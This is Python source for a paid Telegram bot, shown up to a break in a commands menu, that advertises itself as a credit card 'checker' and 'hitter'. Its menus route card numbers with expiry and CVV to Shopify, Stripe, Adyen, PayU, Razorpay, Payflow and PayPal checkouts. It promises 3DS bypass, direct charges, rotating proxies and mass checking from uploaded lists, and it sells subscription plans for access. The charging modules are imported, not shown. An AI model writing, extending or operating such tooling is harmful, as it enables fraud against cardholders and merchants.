# ══════════════════════════════════════════════════════════════════════════════
#  bot.py — P U S S Y build v8 (6-PART · SCREENSHOT UI · FIXED FONTS)
#  PART 1 — Config, logging, typefaces, emoji engine, pools
# ══════════════════════════════════════════════════════════════════════════════

import os
import re
import json
import time
import random
import string
import asyncio
import logging
from io import BytesIO
from logging.handlers import RotatingFileHandler

from aiogram import Bot, Dispatcher, types, Router, F, BaseMiddleware
from aiogram.filters import Command, CommandStart
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatMemberStatus
from aiogram.exceptions import (
    TelegramRetryAfter, TelegramBadRequest,
    TelegramForbiddenError, TelegramNotFound,
)

import auth
import checker_bridge
import hit
import adyen_engine
import payu as _payu_mod
import razorpay as _rz_mod
import payflow as _pf_mod
import paypal_cvv as _pp_mod

from helpers import (
    parse_proxy_format, test_proxy, bin_lookup,
    extract_cc, close_session, CC_PATTERN,
)


# ── ENV ──────────────────────────────────────────────────────────────────────
def _env_int(name, default=0):
    try:
        return int(os.getenv(name, str(default)).strip())
    except (ValueError, AttributeError):
        return default

def _env_int_list(name):
    raw = (os.getenv(name) or "").strip()
    if not raw:
        return []
    out = []
    for chunk in raw.split(","):
        chunk = chunk.strip()
        if chunk:
            try:
                out.append(int(chunk))
            except ValueError:
                pass
    return out


BOT_TOKEN      = (os.getenv("BOT_TOKEN")      or "").strip()
OWNER_ID       = _env_int("OWNER_ID")
ADMIN_IDS      = _env_int_list("ADMIN_IDS")
CHANNEL_ID     = _env_int("CHANNEL_ID")
GROUP_ID       = _env_int("GROUP_ID")
LOG_CHANNEL_ID = _env_int("LOG_CHANNEL_ID")
CHANNEL_LINK   = (os.getenv("CHANNEL_LINK") or "").strip()
GROUP_LINK     = (os.getenv("GROUP_LINK")   or "").strip()

if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN env var is missing.")

BOT_NAME       = "P U S S Y"
OWNER_USERNAME = "@abusemen"
OWNER_NAME     = "@stephen #𝗮𝗯𝘂𝘀𝗲"

auth.OWNER_ID = OWNER_ID
if hasattr(auth, "_admins"):
    try:
        auth._admins = set(ADMIN_IDS)
    except Exception:
        pass


# ── LOGGING ──────────────────────────────────────────────────────────────────
_LOG_DIR = os.path.dirname(os.path.abspath(__file__))
_FMT = logging.Formatter(
    "%(asctime)s │ %(levelname)s │ %(name)s │ %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
_root = logging.getLogger()
_root.setLevel(logging.INFO)
_console = logging.StreamHandler()
_console.setFormatter(_FMT)
_root.addHandler(_console)
try:
    _fh = RotatingFileHandler(
        os.path.join(_LOG_DIR, "bot.log"),
        maxBytes=10 * 1024 * 1024, backupCount=5, encoding="utf-8",
    )
    _fh.setFormatter(_FMT)
    _root.addHandler(_fh)
except Exception:
    pass
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
log = logging.getLogger("bot")


# ── PATHS ────────────────────────────────────────────────────────────────────
BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE  = os.path.join(BASE_DIR, "proxy.json")
SITES_JSON  = os.path.join(BASE_DIR, "sites.json")
SITES_FILE  = os.path.join(BASE_DIR, "sites.txt")
MAINT_FILE  = os.path.join(BASE_DIR, "maintenance.json")


# ── MAINTENANCE ──────────────────────────────────────────────────────────────
_maintenance = {"active": False, "reason": "", "by": 0, "since": 0}

def _load_maintenance():
    global _maintenance
    try:
        with open(MAINT_FILE, "r", encoding="utf-8") as f:
            _maintenance = json.load(f)
    except Exception:
        _maintenance = {"active": False, "reason": "", "by": 0, "since": 0}

def _save_maintenance():
    try:
        with open(MAINT_FILE, "w", encoding="utf-8") as f:
            json.dump(_maintenance, f, indent=2)
    except Exception as e:
        log.error("save maintenance failed: %s", e)

def in_maintenance():
    return bool(_maintenance.get("active"))

_load_maintenance()


# ══════════════════════════════════════════════════════════════════════════════
#  TYPEFACES — Sans-Serif Bold (head) · Monospace (body + digit)
# ══════════════════════════════════════════════════════════════════════════════

_HEAD, _BODY, _DIGIT = {}, {}, {}

# HEAD — Mathematical Sans-Serif Bold
for _i, _c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _HEAD[_c] = chr(0x1D5D4 + _i)   # 𝗔𝗕𝗖...𝗭
for _i, _c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _HEAD[_c] = chr(0x1D5EE + _i)   # 𝗮𝗯𝗰...𝘇
for _i, _c in enumerate("0123456789"):
    _HEAD[_c] = chr(0x1D7EC + _i)   # 𝟬𝟭𝟮...𝟵

# BODY — Mathematical Monospace
for _i, _c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _BODY[_c] = chr(0x1D670 + _i)   # 𝙰𝙱𝙲...𝚉
for _i, _c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _BODY[_c] = chr(0x1D68A + _i)   # 𝚊𝚋𝚌...𝚣
for _i, _c in enumerate("0123456789"):
    _BODY[_c] = chr(0x1D7F6 + _i)   # 𝟶𝟷𝟸...𝟿

# DIGIT — Mathematical Monospace Digits
for _i, _c in enumerate("0123456789"):
    _DIGIT[_c] = chr(0x1D7F6 + _i)

def head(t):  return "".join(_HEAD.get(c, c) for c in str(t))
def body(t):  return "".join(_BODY.get(c, c) for c in str(t))
def digit(t): return "".join(_DIGIT.get(c, c) for c in str(t))
def bold(t):  return head(t)


# ══════════════════════════════════════════════════════════════════════════════
#  PREMIUM EMOJI ENGINE
# ══════════════════════════════════════════════════════════════════════════════

_EMOJI_GLYPH = {
    # FIRE / BOLT
    "5801139183414153005": "🔥", "5256047523620995497": "🔥",
    "5787131512650470512": "🔥", "5787568358069112518": "🔥",
    "5787678420901039906": "🔥", "5787571660898963761": "🔥",
    "5787672970587541975": "🔥", "5789633099172154740": "⚡",
    "5789690484230196266": "⚡", "5787584060469547008": "🔥",
    "5800942216213958438": "🔥", "5787236919737848366": "🔥",
    "5787565192678216265": "🔥", "5992053533443100269": "🔥",
    "6023967962245893649": "🔥", "5424972470023104089": "⚡",
    "5967666107840993442": "⚡", "5465465194056525619": "⚡",
    "5789636316102659794": "🔥", "5875366363001788391": "🔥",
    "5882118532627439887": "🔥", "5882184473260333214": "🔥",
    "5816951388982221159": "🔥", "5798473696645487972": "🔥",
    "5832440600124726538": "🔥", "5845963725562976445": "🔥",
    "5857313460110498417": "🔥", "5857389309232945817": "🔥",
    "5906930056185255802": "🔥", "5796495743946594594": "🔥",
    "5226813248900187912": "⚡",
    # GEM / CROWN
    "5787435351521889877": "💎", "5789514274606943819": "💎",
    "5801005158959683238": "💎", "5787412175878361514": "👑",
    "5800950728839139945": "👑", "5850650604329766810": "👑",
    "5996564258421215002": "👑", "5229011542011299168": "👑",
    "5229045747130843073": "💎", "5217822164362739968": "👑",
    "5226929552319594190": "💎", "5427168083074628963": "💎",
    "5830203660897884772": "💎", "5463046637842608206": "💎",
    "5375312095346704820": "💎", "5226431245918942763": "✅",
    "5229052951342088188": "💎", "5787368831068410589": "💎",
    "5787529402715737895": "💎", "5852848953275453389": "💎",
    "5787193059531821181": "💎", "5789828571723730889": "💎",
    "5803177330079700378": "💎", "5992403319874653249": "💎",
    "5789902320607170281": "💎", "5800709991627232190": "💎",
    "5800758919894666807": "💎", "5789574868005557666": "💎",
    "5801041928174702734": "⭐", "5787456925142618547": "⭐",
    "5789463778676445427": "⭐", "5800883899148013119": "🚀",
    "5800997823155539597": "🚀", "5789910601304116778": "🎁",
    "5800909402663816144": "💎",
    # HEART
    "5787624720924938691": "❤️", "5787539650507706439": "❤️",
    "5906509067785866421": "❤️", "5787429974222835576": "❤️",
    "5787516208576204868": "❤️", "5787175265482314416": "❤️",
    "5787151175010750937": "❤️", "5801025375370743669": "❤️",
    "5801179045005627743": "❤️", "5787406248823492639": "❤️",
    "5992207954697260159": "❤️", "5800789061975150458": "❤️",
    "5801102182270898086": "❤️", "5805630069938327876": "❤️",
    "5805220239863975500": "❤️", "5807490383482982256": "❤️",
    "5800816493931269784": "❤️", "5992288627067981635": "❤️",
    "5992096517475797770": "❤️", "5992148057083350542": "❤️",
    "5992400858858392932": "❤️", "5992171898446809759": "❤️",
    "5992443009667436529": "❤️", "5992171623568902849": "❤️",
    "5994386439419202151": "❤️", "5992385504350309842": "❤️",
    "5994747534499646955": "❤️", "5992339196012924085": "❤️",
    "5992107735930376005": "❤️", "5996719139236875075": "❤️",
    "5992039579094355229": "❤️", "5992337323407183234": "❤️",
    "5992336546018102909": "❤️", "5992162410864053392": "❤️",
    "5992518081400802567": "❤️", "5992128643831172322": "❤️",
    "5994677487878015954": "❤️", "5996596341826916434": "❤️",
    "5787410930337845271": "❤️",
    # STAR / SPARKLE
    "5789865066060844365": "⭐", "5787147833526193811": "⭐",
    "5992169656473881872": "⭐", "5992369565726674435": "⭐",
    "5996789675484778079": "⭐", "5994529208427088542": "⭐",
    "5992581711341292943": "⭐", "5994721863480118593": "⭐",
    "5886285376754031265": "⭐", "5226928895189598791": "⭐",
    "5438496463044752972": "⭐", "5325547803936572038": "⭐",
    "5816829278767028258": "✨", "5850389345764122229": "✨",
    "5226702984204797593": "✨", "5321548429174795341": "✨",
    # CHECK
    "5206607081334906820": "✅", "6046256574769400803": "✅",
    "5222079954421818267": "✅", "5463413771647069835": "✅",
    "5341498088408234504": "✅", "5807810126618299919": "✅",
    "5463423955014529788": "✅",
    # CROSS
    "5210952531676504517": "❌", "5260293700088511294": "❌",
    "5240241223632954241": "❌", "5462882007451185227": "❌",
    "5463358164705489689": "❌", "5454350746407419714": "❌",
    "5372825386591732174": "❌", "5445267414562389170": "❌",
    "5452069934089641166": "❌", "5210956306952758910": "❌",
    # ROCKET
    "5787548987766607930": "🚀", "5787244620614209190": "🚀",
    "5787382197006635012": "🚀",
    # TIME
    "5454415424319931791": "⏱️", "5373236586760651455": "⏱️",
    "5386367538735104399": "⏱️", "5382357040008021292": "⏱️",
    # LINK
    "5321204943460266251": "🔗", "5321166331704275015": "🔗",
    "5224518800061245598": "🔗", "5224369957969603463": "🔗",
    "5224216473018314447": "🔗",
    # GIFT
    "5787195069576515668": "🎁", "5454089058345042483": "🎁",
    # WARN
    "5321108551509242397": "⚠️", "5323793477299887524": "⚠️",
    "5447647474984449520": "⚠️",
}


def pe(emoji_id, fallback="⚡"):
    if not emoji_id:
        return ""
    glyph = _EMOJI_GLYPH.get(str(emoji_id), fallback)
    return f'<tg-emoji emoji-id="{emoji_id}">{glyph}</tg-emoji>'


def pick(pool, fallback="⚡"):
    pool = list(pool) if pool else []
    return pe(random.choice(pool), fallback=fallback) if pool else ""


# ── POOLS ────────────────────────────────────────────────────────────────────
SLOT_EMOJI_ID = "5222079954421818267"

GEM_POOL = ["5787435351521889877","5789514274606943819","5801005158959683238",
            "5787412175878361514","5800950728839139945","5850650604329766810",
            "5996564258421215002","5229011542011299168","5229045747130843073",
            "5217822164362739968","5226929552319594190","5427168083074628963"]

FIRE_POOL = ["5801139183414153005","5256047523620995497","5787131512650470512",
             "5787568358069112518","5787678420901039906","5787571660898963761",
             "5787672970587541975","5789633099172154740","5789690484230196266",
             "5787584060469547008","5800942216213958438","5787236919737848366"]

HEART_POOL = ["5787624720924938691","5787539650507706439","5906509067785866421",
              "5787429974222835576","5787516208576204868","5787175265482314416",
              "5787151175010750937","5801025375370743669","5801179045005627743",
              "5787406248823492639"]

STAR_POOL = ["5789865066060844365","5801041928174702734","5787456925142618547",
             "5789463778676445427","5787147833526193811","5992169656473881872",
             "5992369565726674435","5996789675484778079"]

CHECK_POOL = ["5206607081334906820","6046256574769400803","5222079954421818267",
              "5463413771647069835","5341498088408234504"]

CROSS_POOL = ["5210952531676504517","5260293700088511294","5240241223632954241",
              "5462882007451185227","5463358164705489689"]

ROCKET_POOL = ["5800883899148013119","5800997823155539597","5857313460110498417",
               "5787548987766607930","5787244620614209190","5787382197006635012"]

TIME_POOL = ["5454415424319931791","5373236586760651455","5386367538735104399",
             "5382357040008021292"]

BOLT_POOL = ["5226813248900187912","5256047523620995497","5787131512650470512",
             "5789633099172154740","5789690484230196266","5424972470023104089"]

LINK_POOL = ["5321204943460266251","5321166331704275015","5224518800061245598",
             "5224369957969603463","5224216473018314447"]

SPARKLE_POOL = ["5321548429174795341","5816829278767028258","5850389345764122229",
                "5992169656473881872","5226702984204797593"]

SPIDER_POOL = FIRE_POOL

WARN_POOL = ["5321108551509242397","5323793477299887524","5447647474984449520"]

CROWN_POOL = ["5787412175878361514","5800950728839139945","5850650604329766810",
              "5996564258421215002","5229011542011299168","5217822164362739968"]

GIFT_POOL = ["5789910601304116778","5787548987766607930","5787195069576515668",
             "5454089058345042483","5465465194056525619"]


# ── SITES ────────────────────────────────────────────────────────────────────
_sites_cache = None
_sites_mtime = 0.0

def _load_sites():
    global _sites_cache, _sites_mtime
    src = SITES_JSON if os.path.isfile(SITES_JSON) else SITES_FILE
    try:
        mt = os.path.getmtime(src)
    except OSError:
        return []
    if _sites_cache is not None and mt == _sites_mtime:
        return _sites_cache
    urls = []
    if src == SITES_JSON:
        try:
            with open(src, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                for e in data:
                    s = (e.get("Site") or "").strip().rstrip("/")
                    if s:
                        if not s.startswith("http"):
                            s = "https://" + s
                        urls.append(s)
        except Exception as ex:
            log.error("sites.json load failed: %s", ex)
    else:
        try:
            with open(src, "r", encoding="utf-8") as f:
                urls = [l.strip().rstrip("/") for l in f if l.strip()]
        except Exception as ex:
            log.error("sites.txt load failed: %s", ex)
    seen = set()
    dedup = [u for u in urls if not (u in seen or seen.add(u))]
    _sites_cache = dedup
    _sites_mtime = mt
    return _sites_cache

def get_random_site():
    s = _load_sites()
    return random.choice(s) if s else None


# ── PROXY STORAGE ────────────────────────────────────────────────────────────
_proxy_cache = None
_proxy_mtime = 0.0
MAX_PROXIES_PER_USER = 30

def _load_proxies():
    global _proxy_cache, _proxy_mtime
    try:
        mt = os.path.getmtime(PROXY_FILE)
    except OSError:
        return {}
    if _proxy_cache is not None and mt == _proxy_mtime:
        return _proxy_cache
    try:
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            _proxy_cache = json.load(f)
            _proxy_mtime = mt
            return _proxy_cache
    except Exception:
        return {}

def _save_proxies(data):
    global _proxy_cache, _proxy_mtime
    with open(PROXY_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    _proxy_cache = data
    try:
        _proxy_mtime = os.path.getmtime(PROXY_FILE)
    except OSError:
        _proxy_mtime = 0.0

def get_user_proxies(user_id):
    data = _load_proxies()
    proxies = data.get(str(user_id), [])
    if isinstance(proxies, dict):
        proxies = [proxies] if proxies else []
    if isinstance(proxies, str):
        proxies = [proxies] if proxies.strip() else []
    out = []
    for p in proxies:
        if isinstance(p, dict):
            out.append(p)
        elif isinstance(p, str) and p.strip():
            parsed = parse_proxy_format(p.strip())
            if parsed:
                out.append(parsed)
    return out

def get_user_proxy(user_id):
    lst = get_user_proxies(user_id)
    return random.choice(lst) if lst else None

def add_user_proxies(user_id, new):
    data = _load_proxies()
    existing = data.get(str(user_id), [])
    if isinstance(existing, dict):
        existing = [existing] if existing else []
    existing.extend(new)
    data[str(user_id)] = existing[:MAX_PROXIES_PER_USER]
    _save_proxies(data)

def del_user_proxy(user_id):
    data = _load_proxies()
    data.pop(str(user_id), None)
    _save_proxies(data)# ══════════════════════════════════════════════════════════════════════════════
#  PART 2 — Bot, middleware, join gate, premium gate
# ══════════════════════════════════════════════════════════════════════════════

import concurrent.futures

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)
CHECKER_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=200)


class _MaintenanceGate(BaseMiddleware):
    async def __call__(self, handler, event, data):
        if not in_maintenance():
            return await handler(event, data)
        user = data.get("event_from_user")
        if user and user.id == OWNER_ID:
            return await handler(event, data)
        return


class _Throttle(BaseMiddleware):
    _RATE, _WINDOW, _LIMIT = 0.4, 10.0, 20
    _last = {}
    _events = {}
    async def __call__(self, handler, event, data):
        user = data.get("event_from_user")
        if not user:
            return await handler(event, data)
        uid = user.id
        if auth.is_banned(uid):
            return
        now = time.monotonic()
        ev = [t for t in self._events.get(uid, []) if now - t < self._WINDOW]
        ev.append(now)
        self._events[uid] = ev
        if len(ev) >= self._LIMIT:
            try:
                auth.ban_user(uid)
            except Exception:
                pass
            return
        last = self._last.get(uid, 0.0)
        if now - last < self._RATE:
            await asyncio.sleep(self._RATE - (now - last))
        self._last[uid] = time.monotonic()
        return await handler(event, data)


dp.message.middleware(_MaintenanceGate())
dp.callback_query.middleware(_MaintenanceGate())
dp.message.middleware(_Throttle())
dp.callback_query.middleware(_Throttle())


async def safe_edit(msg, text, **kwargs):
    for attempt in range(2):
        try:
            await msg.edit_text(text, **kwargs)
            return True
        except TelegramRetryAfter as e:
            await asyncio.sleep(min(e.retry_after + 1, 15))
        except TelegramBadRequest as e:
            emsg = str(e).lower()
            if "message is not modified" in emsg:
                return True
            if any(x in emsg for x in (
                "message can't be edited", "message to edit not found",
                "chat not found", "message_id_invalid",
            )):
                return False
            return False
        except (TelegramForbiddenError, TelegramNotFound):
            return False
        except Exception as e:
            log.error("safe_edit error: %s", e, exc_info=True)
            return False
    return False


@dp.errors()
async def global_error_handler(event):
    exc = event.exception
    if isinstance(exc, TelegramRetryAfter):
        await asyncio.sleep(exc.retry_after + 1)
        return True
    if isinstance(exc, TelegramForbiddenError):
        return True
    log.error("Unhandled: %s", exc, exc_info=True)
    return True


# ── JOIN GATE ────────────────────────────────────────────────────────────────
_join_cache = {}
_OK_TTL, _NO_TTL = 300, 30

async def check_user_joined(user_id, force=False):
    now = time.time()
    if not force:
        cached = _join_cache.get(user_id)
        if cached:
            ttl = _OK_TTL if cached[0] else _NO_TTL
            if now - cached[1] < ttl:
                return cached[0]
    try:
        valid = {ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR}
        ch = await bot.get_chat_member(CHANNEL_ID, user_id)
        gr = await bot.get_chat_member(GROUP_ID, user_id)
        result = ch.status in valid and gr.status in valid
    except Exception:
        result = False
    _join_cache[user_id] = (result, now)
    return result


def join_keyboard():
    return {"inline_keyboard": [
        [
            {"text": "Join Channel", "url": CHANNEL_LINK,
             "icon_custom_emoji_id": random.choice(FIRE_POOL), "style": "primary"},
            {"text": "Join Group", "url": GROUP_LINK,
             "icon_custom_emoji_id": random.choice(HEART_POOL), "style": "primary"},
        ],
        [{"text": "Verify Joined", "callback_data": "verify_join",
          "icon_custom_emoji_id": random.choice(CHECK_POOL), "style": "success"}],
    ]}

JOIN_MSG = (
    f"{pick(FIRE_POOL)} {bold('Access Restricted')}\n\n"
    f"{pick(HEART_POOL)} {bold('You must join our channel and group to use this bot.')}\n\n"
    f"{pick(ROCKET_POOL)} {bold('Tap the buttons below to join, then tap Verify.')}"
)


# ── PREMIUM GATE ─────────────────────────────────────────────────────────────
def has_active_plan(user_id, chat_id):
    try:
        return bool(auth.has_premium_access(user_id, chat_id))
    except Exception:
        return False


def access_denied_msg(user_id, reason="No permission to use this bot."):
    return (
        f"<code>[≡] {head('Access')} » {head('Denied')} {pick(CROSS_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Reason')} » {body(reason)} {pick(WARN_POOL)}\n"
        f"[≡] {head('Your ID')} » {digit(str(user_id))} {pick(CROWN_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Unlock')} » /redeem {body('KEY')}\n"
        f"[≡] {head('or Contact')} » {body('@stephen #𝗮𝗯𝘂𝘀𝗲')} {pick(GIFT_POOL)}</code>"
    )


def access_denied_kb():
    return {"inline_keyboard": [
        [{"text": "Redeem Key", "callback_data": "xd_cmd:redeem",
          "icon_custom_emoji_id": random.choice(GIFT_POOL), "style": "success"},
         {"text": "Contact", "callback_data": "xd_contact",
          "icon_custom_emoji_id": random.choice(HEART_POOL), "style": "primary"}],
    ]}# ══════════════════════════════════════════════════════════════════════════════
#  PART 3 — /start UI + submenus + gate info
# ══════════════════════════════════════════════════════════════════════════════

def build_welcome_msg():
    divider = "─" * 16
    return (
        f"<code>"
        f"[≡] {head('Bot')} » {body('XD')} »  {pick(STAR_POOL)}\n"
        f"[≡] {head('Type')} » {body('Premium CC Checker')} » {pick(GEM_POOL)}\n"
        f"\n"
        f"{divider}\n"
        f"\n"
        f"[≡] {head('Gate')} » {body('Stripe · Shopify · Adyen')} » {pick(STAR_POOL)}\n"
        f"[≡] {head('3DS')} »  {body('Bypass Supported')} »  {pick(CHECK_POOL)}\n"
        f"[≡] {head('Proxy')} » {body('HTTP · SOCKS4 · SOCKS5')} » {pick(LINK_POOL)}\n"
        f"[≡] {head('Speed')} » {body('Multi-worker · Rotating')} » {pick(STAR_POOL)}\n"
        f"\n"
        f"{divider}\n"
        f"\n"
        f"[≡] {head('Menu')} » {body('Select option below')} » {pick(STAR_POOL)}\n"
        f"</code>"
    )


def menu_keyboard():
    return {"inline_keyboard": [
        [
            {"text": "Checker",  "callback_data": "menu_check",
             "icon_custom_emoji_id": random.choice(FIRE_POOL),   "style": "danger"},
            {"text": "Hitter",   "callback_data": "xd_hitter",
             "icon_custom_emoji_id": random.choice(SPIDER_POOL), "style": "danger"},
        ],
        [
            {"text": "Plans",    "callback_data": "xd_plans",
             "icon_custom_emoji_id": random.choice(CROWN_POOL),  "style": "success"},
            {"text": "Profile",  "callback_data": "menu_profile",
             "icon_custom_emoji_id": random.choice(GEM_POOL),    "style": "primary"},
        ],
        [
            {"text": "Commands", "callback_data": "xd_commands",
             "icon_custom_emoji_id": random.choice(TIME_POOL),   "style": "primary"},
            {"text": "Contact",  "callback_data": "xd_contact",
             "icon_custom_emoji_id": random.choice(GIFT_POOL),   "style": "success"},
        ],
    ]}


def back_keyboard():
    return {"inline_keyboard": [
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": random.choice(CROSS_POOL), "style": "danger"}],
    ]}


@router.message(CommandStart())
async def cmd_start(message: types.Message):
    try:
        auth.save_user(message.from_user.id, message.from_user.username,
                       message.from_user.full_name)
    except Exception:
        pass
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(message.from_user.id):
        await message.reply(f"{pick(CROSS_POOL)} {bold('You are banned from this bot!')}")
        return
    await message.reply(build_welcome_msg(), reply_markup=menu_keyboard())


@router.callback_query(F.data == "verify_join")
async def cb_verify_join(callback: types.CallbackQuery):
    if not await check_user_joined(callback.from_user.id, force=True):
        await callback.answer(bold("You have not joined yet!"), show_alert=True)
        return
    await callback.answer(bold("Verified! Welcome!"))
    await safe_edit(callback.message, build_welcome_msg(), reply_markup=menu_keyboard())


@router.callback_query(F.data == "menu_back")
async def cb_menu_back(callback: types.CallbackQuery):
    await callback.answer()
    try:
        await safe_edit(callback.message, build_welcome_msg(), reply_markup=menu_keyboard())
    except Exception:
        pass


# ── SUBMENUS ─────────────────────────────────────────────────────────────────
@router.callback_query(F.data == "menu_check")
async def cb_menu_check(callback: types.CallbackQuery):
    await callback.answer()
    uid = callback.from_user.id
    if not has_active_plan(uid, callback.message.chat.id):
        try:
            await safe_edit(callback.message, access_denied_msg(uid),
                            reply_markup=access_denied_kb())
        except Exception:
            pass
        return
    text = (
        f"<code>[≡] {head('Checker')} » {head('Main Menu')} {pick(FIRE_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {body('Shopify')}   » /sh /msh {pick(GEM_POOL)}\n"
        f"[≡] {body('Stripe')}    » /hit {pick(BOLT_POOL)}\n"
        f"[≡] {body('PayU')}      » /payu {pick(ROCKET_POOL)}\n"
        f"[≡] {body('Razorpay')}  » /rz {pick(STAR_POOL)}\n"
        f"[≡] {body('Payflow')}   » /pf {pick(SPARKLE_POOL)}\n"
        f"[≡] {body('PayPal')}    » /pp {pick(GIFT_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Tip')} » {body('Tap any gate for full details')} {pick(SPARKLE_POOL)}</code>"
    )
    kb = {"inline_keyboard": [
        [
            {"text": "Shopify", "callback_data": "gate_info:shopify",
             "icon_custom_emoji_id": random.choice(GEM_POOL), "style": "success"},
            {"text": "Hitter",  "callback_data": "xd_hitter",
             "icon_custom_emoji_id": random.choice(SPIDER_POOL), "style": "danger"},
        ],
        [
            {"text": "PayU",     "callback_data": "gate_info:payu",
             "icon_custom_emoji_id": random.choice(ROCKET_POOL), "style": "primary"},
            {"text": "Razorpay", "callback_data": "gate_info:rz",
             "icon_custom_emoji_id": random.choice(STAR_POOL), "style": "primary"},
        ],
        [
            {"text": "Payflow", "callback_data": "gate_info:pf",
             "icon_custom_emoji_id": random.choice(SPARKLE_POOL), "style": "success"},
            {"text": "PayPal",  "callback_data": "gate_info:pp",
             "icon_custom_emoji_id": random.choice(GIFT_POOL), "style": "success"},
        ],
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": random.choice(CROSS_POOL), "style": "danger"}],
    ]}
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data == "xd_hitter")
async def cb_xd_hitter(callback: types.CallbackQuery):
    await callback.answer()
    uid = callback.from_user.id
    if not has_active_plan(uid, callback.message.chat.id):
        try:
            await safe_edit(callback.message, access_denied_msg(uid),
                            reply_markup=access_denied_kb())
        except Exception:
            pass
        return
    text = (
        f"<code>[≡] {head('Hitter')} » {head('Stripe + Adyen')} {pick(SPIDER_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Stripe')} » {body('/hit url cc|mm|yy|cvv')} {pick(BOLT_POOL)}\n"
        f"[≡] {body('3DS Bypass · Direct Charge')}\n"
        f"[≡] {body('Full BIN · Multi-card support')}\n"
        f"──────────────────\n"
        f"[≡] {head('Adyen')} » {body('/ady url cc|mm|yy|cvv')} {pick(HEART_POOL)}\n"
        f"[≡] {body('Pay-by-link · Live 3DS')}\n"
        f"[≡] {body('Cloudflare worker fallback')}\n"
        f"──────────────────\n"
        f"[≡] {head('Example')} » {pick(FIRE_POOL)}\n"
        f"/hit https://checkout.stripe.com/... 4111|12|26|123\n"
        f"/ady https://eu.adyen.link/... 4111|12|26|123</code>"
    )
    kb = {"inline_keyboard": [
        [
            {"text": "Stripe Hit", "callback_data": "gate_info:stripe",
             "icon_custom_emoji_id": random.choice(BOLT_POOL), "style": "primary"},
            {"text": "Adyen Hit", "callback_data": "gate_info:adyen",
             "icon_custom_emoji_id": random.choice(HEART_POOL), "style": "success"},
        ],
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": random.choice(CROSS_POOL), "style": "danger"}],
    ]}
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data == "xd_plans")
async def cb_xd_plans(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"<code>[≡] {head('Plans')} » {head('Access Plans')} {pick(GEM_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Checks')} » {body('Unlimited — no credit deduction')} {pick(SLOT_EMOJI_ID)}\n"
        f"──────────────────\n"
        f"[≡] {head('Trial')}      {body('Free')} {pick(GIFT_POOL)}\n"
        f"[≡] {head('Duration')}   {body('3 Hours')} {pick(TIME_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Weekly')}     ${digit('10')} {pick(ROCKET_POOL)}\n"
        f"[≡] {head('Duration')}   {digit('7')} {body('Days')} {pick(TIME_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Bi-Weekly')}  ${digit('18')} {pick(STAR_POOL)}\n"
        f"[≡] {head('Duration')}   {digit('15')} {body('Days')} {pick(TIME_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Monthly')}    ${digit('30')} {pick(CROWN_POOL)}\n"
        f"[≡] {head('Duration')}   {digit('30')} {body('Days')} {pick(TIME_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Redeem')} » {body('/redeem KEY')} {pick(GIFT_POOL)}\n"
        f"[≡] {head('Owner')}  » {body(OWNER_NAME)} {pick(CROWN_POOL)}</code>"
    )
    kb = {"inline_keyboard": [
        [{"text": "Redeem Key", "callback_data": "xd_cmd:redeem",
          "icon_custom_emoji_id": random.choice(GIFT_POOL), "style": "success"}],
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": random.choice(CROSS_POOL), "style": "danger"}],
    ]}
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data == "xd_commands")
async def cb_xd_commands(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"<code>[≡] {head('Commands')} » {head('Reference')} {pick(BOLT_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Checker')} {pick(FIRE_POOL)}\n"
        f"[≡] /sh » {body('cc|mm|yy|cvv — Shopify single')}\n"
        f"[≡] /msh » {body('Mass check — reply .txt')}\n"
        f"[≡] /hit » {body('url cc|mm|yy|cvv — Stripe')}\n"
        f"[≡] /ady » {body('url cc|mm|yy|cvv — Adyen')}\n"
        f"──────────────────\n"
        f"[≡] {head('Single Gates')} {pick(ROCKET_POOL)}\n"
        f"[≡] /payu » {body('cc|mm|yy|cvv — PayU 1$')}\n"
        f"[≡] /rz » {body('cc|mm|yy|cvv — Razorpay 1₹')}\n"
        f"[≡] /pf » {body('cc|mm|yy|cvv — Payflow 5$')}\n"
        f"[≡] /pp » {body('cc|mm|yy|cvv — PayPal 0.10$')}\n"
        f"──────────────────\n"
        f"[≡] {head('Plan')} {pick(GEM_POOL)}\n"
